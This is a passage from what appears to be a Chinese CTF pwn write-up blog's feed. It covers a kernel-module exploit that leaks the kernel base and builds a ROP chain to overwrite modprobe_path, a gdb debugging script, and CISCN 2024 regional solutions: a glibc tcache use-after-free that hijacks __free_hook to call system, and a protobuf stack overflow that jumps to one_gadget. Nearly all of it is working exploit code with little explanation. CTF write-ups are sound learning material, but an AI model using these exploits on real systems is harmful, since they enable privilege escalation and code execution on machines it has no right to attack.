class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>modprobe_path<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] modprobe_path = 0x%lx\n"</span><span class="token punctuation">,</span> modprobe_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/tmp/xx"</span><span class="token punctuation">;</span><span class="token comment">//0xffffffff8107c550 : mov qword ptr [rdi], rsi ; jmp 0xffffffff81e02640</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>modprobe_path<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RSI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span>target<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xffffffff8107c550</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>modprobe_getflag<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/c7853eaab2a7f09c4eb4a8fe4a2f3804_MD5.jpeg"></p><p>动调脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>gdb <span class="token parameter variable">-q</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">""</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"file ./vmlinux"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"set \<span class="token variable">$kobase</span> = 0xffffffffc0068000"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"add-symbol-file ./rootfs/lib/modules/5.10.0-9-generic/kernel/test.ko \<span class="token variable">$kobase</span> "</span><span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"b *(\<span class="token variable">$kobase</span>+0x0000000000000282)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Emoji：暂存"><a href="#Emoji：暂存" class="headerlink" title="Emoji：暂存"></a>Emoji：暂存</h1>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024华中赛区选拔赛</title>
      <link href="/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>入围决赛，不枉此行吧</p></blockquote><p><img src="/EXP_FILE/a93659a4e81aa611ef0c9e7fa4bcc640_MD5.jpeg"><br><img src="/EXP_FILE/080007363601715580c7f21bb36ab8c9_MD5.jpeg"></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>2.31 UAF，tcache 打__free_hook即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'5. exit'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch，我直接把 free 这条代码删除了<br><img src="/EXP_FILE/799389c69a658f8d66246317506c0518_MD5.jpeg"></p><h1 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h1><p>就是一个protobuf的序列化，栈溢出，我直接打的one_gadget</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">protoMessage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> name <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> phoneNumber <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">bytes</span> buffer <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">uint32</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> message_pb2<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>phoneNumber<span class="token punctuation">,</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>msg<span class="token operator">=</span>message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>name<span class="token operator">=</span>namemsg<span class="token punctuation">.</span>phoneNumber<span class="token operator">=</span>phoneNumbermsg<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token operator">=</span><span class="token builtin">buffer</span>msg<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token keyword">return</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Gift: 0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x210</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x0000000000003344)'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>message<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token 